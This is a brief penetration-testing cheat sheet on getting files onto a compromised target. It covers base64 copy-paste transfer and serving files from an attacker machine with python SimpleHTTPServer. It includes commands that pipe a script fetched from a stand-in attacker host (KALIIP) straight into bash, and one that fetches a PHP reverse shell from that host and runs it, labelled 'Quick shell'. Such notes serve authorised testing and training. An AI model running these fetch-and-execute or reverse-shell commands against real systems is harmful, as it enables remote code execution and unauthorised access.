# Transferring Files

This section could easily be put in the post-exploitation section. But I consider this knowledge so fundamental that I chose to put it here.



## Giant file transfer, can't transfer over network

```
base64 file
highlight beginning, hit enter to copy to bottom, ctrl+c, paste
base64 -d pastedfile
md5sum both to ensure accurate completion
```

# Quick file transfer & execute scripts

```
on attack
python -m SimpleHTTPServer 8080

on target
curl KALIIP:8080/LinEnum.sh | bash
LinEnum as example

```

```
Quick shell

on target
curl http://KALIIP/php-reverse-shell.php | php
```



